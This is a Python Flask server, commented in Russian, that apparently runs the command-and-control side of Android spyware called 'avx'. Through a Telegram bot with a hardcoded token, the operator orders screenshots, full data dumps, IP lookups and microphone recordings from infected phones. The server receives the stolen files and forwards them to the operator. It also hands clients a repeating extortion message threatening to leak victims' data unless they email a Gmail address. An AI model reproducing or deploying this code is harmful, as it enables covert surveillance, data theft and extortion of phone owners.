"""
server.py — единая точка:
  • крутит бота (getUpdates / sendMessage / sendDocument)
  • принимает дампы от клиента (POST /upload)
  • раздаёт конфиг клиенту (GET /config)
  • отдаёт клиенту команды через long-poll (GET /commands)
  • отправляет результат клиента в бот
"""

import os
import json
import time
import queue
import zipfile
import threading
from pathlib import Path

import requests
from flask import Flask, request, jsonify

# ═══════════════════════════════════════
#  ЕДИНСТВЕННЫЙ КОНФИГ
# ═══════════════════════════════════════

BOT_TOKEN = "8552121942:AAF8bygD17mskbtvuPnZ1-_407a3ooT_CA4"
OWNER_ID  = 6716592576

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5000

SPAM_MESSAGE  = (
    "your data is gone, so as not to leak it, write to the mail "
    "domnaalmazniy33@gmail.com :)))))))))))))))))))"
)
SPAM_INTERVAL = 1.0

API = f"https://api.telegram.org/bot{BOT_TOKEN}"

app  = Flask(__name__)
DUMPS = Path("./dumps")
DUMPS.mkdir(exist_ok=True)


# ═══════════════════════════════════════
#  МИНИ-ОБЁРТКА BOT API
# ═══════════════════════════════════════

def tg(method: str, **kwargs):
    try:
        return requests.post(f"{API}/{method}", data=kwargs, timeout=60).json()
    except Exception as e:
        print(f"[tg:{method}] {e}")
        return {"ok": False}


def tg_file(method: str, files: dict, data: dict):
    try:
        return requests.post(f"{API}/{method}", files=files, data=data, timeout=120).json()
    except Exception as e:
        print(f"[tg:{method}] {e}")
        return {"ok": False}


def tg_send_text(text: str, kb: dict | None = None):
    data = {"chat_id": OWNER_ID, "text": text, "parse_mode": "Markdown"}
    if kb:
        data["reply_markup"] = json.dumps(kb)
    return tg("sendMessage", **data)


def tg_send_document(path: Path, caption: str = ""):
    with open(path, "rb") as f:
        return tg_file(
            "sendDocument",
            files={"document": f},
            data={"chat_id": OWNER_ID, "caption": caption, "parse_mode": "Markdown"},
        )


def tg_send_photo(path: Path, caption: str = ""):
    with open(path, "rb") as f:
        return tg_file(
            "sendPhoto",
            files={"photo": f},
            data={"chat_id": OWNER_ID, "caption": caption, "parse_mode": "Markdown"},
        )


def tg_send_voice(path: Path):
    with open(path, "rb") as f:
        return tg_file(
            "sendVoice",
            files={"voice": f},
            data={"chat_id": OWNER_ID},
        )


def kb() -> dict:
    return {
        "keyboard": [
            [{"text": "📸 screenshot"}, {"text": "📱 info"}],
            [{"text": "📦 full dump"},  {"text": "🌐 ip"}],
            [{"text": "🔊 vibe"},       {"text": "🎤 mic"}],
            [{"text": "💀 kill"}],
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False,
    }


# ═══════════════════════════════════════
#  ОЧЕРЕДЬ КОМАНД ДЛЯ КЛИЕНТА
# ═══════════════════════════════════════

# каждая команда — dict: {"cmd": str, "args": dict}
_command_queue: "queue.Queue[dict]" = queue.Queue()

# клиентские сессии: id → last_seen
_clients: dict[str, float] = {}


def _push_command(cmd: str, **args):
    _command_queue.put({"cmd": cmd, "args": args})


# ═══════════════════════════════════════
#  БОТ — ПРИЁМ СООБЩЕНИЙ ОТ ХОЗЯИНА
# ═══════════════════════════════════════

def bot_poll_loop():
    """читает сообщения от OWNER_ID и раскидывает их в очередь для клиента."""
    offset = None
    while True:
        try:
            params = {"timeout": 25, "allowed_updates": json.dumps(["message"])}
            if offset is not None:
                params["offset"] = offset
            r = requests.get(f"{API}/getUpdates", params=params, timeout=35).json()
            if not r.get("ok"):
                time.sleep(3)
                continue
            for item in r.get("result", []):
                offset = item["update_id"] + 1
                msg = item.get("message")
                if not msg:
                    continue
                if msg.get("from", {}).get("id") != OWNER_ID:
                    continue

                text = msg.get("text", "")

                if text == "/start":
                    tg_send_text("avx online 🪱\nвыбирай:", kb=kb())
                elif text == "📸 screenshot":
                    _push_command("screenshot")
                    tg_send_text("→ запросил скриншот")
                elif text == "📱 info":
                    _push_command("info")
                    tg_send_text("→ запросил инфо")
                elif text == "📦 full dump":
                    _push_command("dump")
                    tg_send_text("→ запросил дамп")
                elif text == "🌐 ip":
                    _push_command("ip")
                    tg_send_text("→ запросил ip")
                elif text == "🔊 vibe":
                    _push_command("vibe")
                    tg_send_text("→ вибрирую")
                elif text == "🎤 mic":
                    _push_command("mic")
                    tg_send_text("→ слушаю микрофон")
                elif text == "💀 kill":
                    _push_command("kill")
                    tg_send_text("off 💀")
                else:
                    tg_send_text(f"неизвестная команда: `{text}`")
        except Exception as e:
            print(f"[bot] {e}")
            time.sleep(3)


# ═══════════════════════════════════════
#  РОУТЫ ДЛЯ КЛИЕНТА
# ═══════════════════════════════════════

@app.route("/config", methods=["GET"])
def route_config():
    """клиент забирает сюда всё что ему нужно при старте."""
    return jsonify({
        "spam_message":  SPAM_MESSAGE,
        "spam_interval": SPAM_INTERVAL,
    }), 200


@app.route("/commands", methods=["GET"])
def route_commands():
    """
    long-poll: клиент держит соединение, сервер отдаёт команду как только она появилась.
    если за 25 сек ничего не пришло — 204, клиент переподключится.
    """
    client_id = request.args.get("id", "anon")
    _clients[client_id] = time.time()

    try:
        cmd = _command_queue.get(timeout=25)
        return jsonify({"ok": True, "command": cmd}), 200
    except queue.Empty:
        return "", 204


@app.route("/upload", methods=["POST"])
def route_upload():
    """клиент шлёт сюда zip. сервер распаковывает и пересылает хозяину в бот."""
    if "file" not in request.files:
        return jsonify({"ok": False, "err": "no file"}), 400

    f = request.files["file"]
    raw_info = request.form.get("info", "{}")
    try:
        info = json.loads(raw_info)
    except Exception:
        info = {"raw": raw_info}

    stamp = time.strftime("%Y%m%d_%H%M%S")
    work = DUMPS / stamp
    work.mkdir(parents=True, exist_ok=True)

    zip_path = work / f.name
    f.save(zip_path)

    try:
        with zipfile.ZipFile(zip_path, "r") as z:
            z.extractall(work / "unpacked")
    except Exception as e:
        print(f"[unzip] {e}")

    (work / "meta.json").write_text(
        json.dumps(info, ensure_ascii=False, indent=2), encoding="utf-8"
    )

    tag = request.form.get("tag", "REPORT")
    caption = (
        f"*[{tag}] — dump* `{stamp}`\n"
        f"```\n"
        f"User:    {info.get('user','-')}\n"
        f"Host:    {info.get('hostname','-')}\n"
        f"Model:   {info.get('brand','-')} {info.get('model','-')}\n"
        f"Android: {info.get('android','-')} (sdk {info.get('sdk','-')})\n"
        f"ABI:     {info.get('cpu_abi','-')}\n"
        f"Apps:    {len(info.get('installed_apps', []))}\n"
        f"```"
    )
    tg_send_document(zip_path, caption=caption)

    return jsonify({"ok": True, "stamp": stamp}), 200


@app.route("/upload_photo", methods=["POST"])
def route_upload_photo():
    """отдельный роут для скриншота — сразу шлём картинкой, не в архиве."""
    if "file" not in request.files:
        return jsonify({"ok": False, "err": "no file"}), 400

    f = request.files["file"]
    tmp = DUMPS / f"shot_{int(time.time())}.png"
    f.save(tmp)

    caption = request.form.get("caption", "📸")
    tg_send_photo(tmp, caption=caption)
    return jsonify({"ok": True}), 200


@app.route("/upload_voice", methods=["POST"])
def route_upload_voice():
    if "file" not in request.files:
        return jsonify({"ok": False, "err": "no file"}), 400

    f = request.files["file"]
    tmp = DUMPS / f"mic_{int(time.time())}.wav"
    f.save(tmp)

    tg_send_voice(tmp)
    return jsonify({"ok": True}), 200


@app.route("/upload_text", methods=["POST"])
def route_upload_text():
    """клиент может просто прислать текст — сервер перекинет его в бот."""
    text = request.form.get("text", "")
    tag  = request.form.get("tag", "MSG")
    if text:
        tg_send_text(f"*[{tag}]*\n{text}")
    return jsonify({"ok": True}), 200


@app.route("/clients", methods=["GET"])
def route_clients():
    now = time.time()
    active = {k: round(now - v, 1) for k, v in _clients.items()}
    return jsonify({"ok": True, "clients": active}), 200


@app.route("/health", methods=["GET"])
def route_health():
    return jsonify({"ok": True, "dumps": len(list(DUMPS.iterdir()))}), 200


@app.route("/", methods=["GET"])
def route_index():
    return "avx server online 🪱", 200


# ═══════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════

if __name__ == "__main__":
    # бот в отдельном потоке — не мешает flask
    threading.Thread(target=bot_poll_loop, daemon=True).start()

    tg_send_text("🪱 server started", kb=kb())
    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False, threaded=True)
